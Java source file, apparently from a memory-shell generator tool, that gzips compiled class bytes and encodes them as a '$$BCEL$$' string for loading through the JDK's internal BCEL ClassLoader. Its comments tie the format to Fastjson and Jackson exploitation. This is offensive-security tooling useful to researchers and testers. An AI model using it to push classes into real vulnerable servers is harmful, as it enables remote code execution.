package org.leo.jmg.mem.packer.bcel;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPOutputStream;

/**
 * BCEL ClassLoader 格式打包器。
 * <p>
 * 输出 {@code $$BCEL$$} 前缀的编码字符串，可被 {@code com.sun.org.apache.bcel.internal.util.ClassLoader} 直接加载。
 * 常见于 Fastjson、Jackson 等利用场景。
 * <p>
 * 编码规则（与 JDK 内置 BCEL Utility.encode 一致）：
 * <ul>
 *   <li>{@code $} 作为转义前缀</li>
 *   <li>可打印 ASCII（不含 {@code $} 和 {@code .}）直接保留</li>
 *   <li>其他字节用 {@code $xx} 两位十六进制表示</li>
 * </ul>
 *
 * @author LeoSpring
 */
@PackerMeta(name = "BCEL", group = "BCEL", order = 1)
public class BCELPacker implements Packer {

    private static final char[] HEX = "0123456789abcdef".toCharArray();

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        byte[] classBytes = config.getClassBytes();
        // BCEL 标准行为：先 gzip 压缩再编码
        byte[] compressed = gzipCompress(classBytes);
        return "$$BCEL$$" + bcelEncode(compressed);
    }

    /**
     * BCEL 编码（与 com.sun.org.apache.bcel.internal.classfile.Utility.encode 行为一致）
     */
    private static String bcelEncode(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            int ch = b & 0xFF;
            // 可打印 ASCII 且不是 $ 和 .
            if (ch >= 0x21 && ch <= 0x7E && ch != '$' && ch != '.') {
                sb.append((char) ch);
            } else {
                sb.append('$');
                sb.append(HEX[ch >> 4]);
                sb.append(HEX[ch & 0x0F]);
            }
        }
        return sb.toString();
    }

    private static byte[] gzipCompress(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (GZIPOutputStream gzip = new GZIPOutputStream(out)) {
            gzip.write(data);
        }
        return out.toByteArray();
    }
}
